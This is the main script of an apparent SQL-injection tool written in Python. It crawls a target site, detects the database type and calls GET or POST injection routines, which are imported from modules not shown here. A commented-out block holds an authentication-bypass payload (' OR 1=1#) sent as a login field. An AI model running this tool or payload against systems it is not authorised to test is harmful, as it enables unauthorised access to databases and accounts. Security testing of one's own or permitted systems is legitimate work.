from utils.ainsi import *
from utils.utils import *

from GET.navigation.crawler import *

from GET.detection.get_db_detector import *

from GET.injection.get_inject import *

from POST.post_db_detector import *

from POST.post_inject import *

import requests



        
    

def main():
    target_url, output_file, request_method = init()
    scrapped_data = simple_crawler(target_url)
    
    
    output_file = write_scrapped_data(scrapped_data, output_file, target_url)


    if "get" in request_method.lower():
        get_injection(identify_db_get(scrapped_data), output_file) 
    elif "post" in request_method.lower():
        post_injection(identify_db_post(scrapped_data), output_file)        
        # print(success)
        # print(db_type)
        # print(method)
        
        # identify_db_post(scrapped_data)
        
        # parametres = {
        #     'user': "' OR 1=1#",
        #     'password':"pass"
        # }
                
        # response = requests.post(target_url, timeout=10, data=parametres)
        
        # print(response.text)
        
    else:
        print("Wrong method")
        
    
if __name__ == "__main__":
    main()